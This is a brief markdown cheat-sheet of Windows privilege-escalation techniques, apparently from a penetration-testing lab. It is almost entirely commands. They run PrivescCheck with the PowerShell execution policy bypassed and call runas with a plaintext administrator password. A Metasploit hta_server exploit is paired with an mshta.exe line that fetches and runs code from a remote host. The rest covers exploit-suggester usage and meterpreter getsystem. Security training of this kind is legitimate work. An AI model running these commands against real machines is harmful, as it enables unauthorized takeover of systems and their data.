# Windows Privilege Escalation

Wiki for collected windows privesc here

## Github

```bash
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/bitsadmin/wesng
https://github.com/SecWiki/windows-kernel-exploits
```

## Manual

Option 1

```powershell
#https://github.com/itm4n/PrivescCheck
cd C:\Users\student\Desktop\PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
runas.exe /user:administrator cmd
hello_123321
whoami
```

```bash
msfconsole
use exploit/windows/misc/hta_server
run
```

You need to execute the below payload on the cmd.exe.

```bash
mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
```

Option 2

```bash
#https://github.com/AonCyberLabs/Windows-Exploit-Suggester
sysinfo # copy the result into a txt file
echo '[PASTE]' > sysinfo.txt
#for first run
./windows-exploit-suggester.py --update
#example usage
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt #highest means priority in the result
```

## Metasploit

```bash
#meterpreter
getuid
getprivs
getsystem #for auto privesc
#suggester
use multi/recon/local_exploit_suggester
sessions
set session 1
run
```
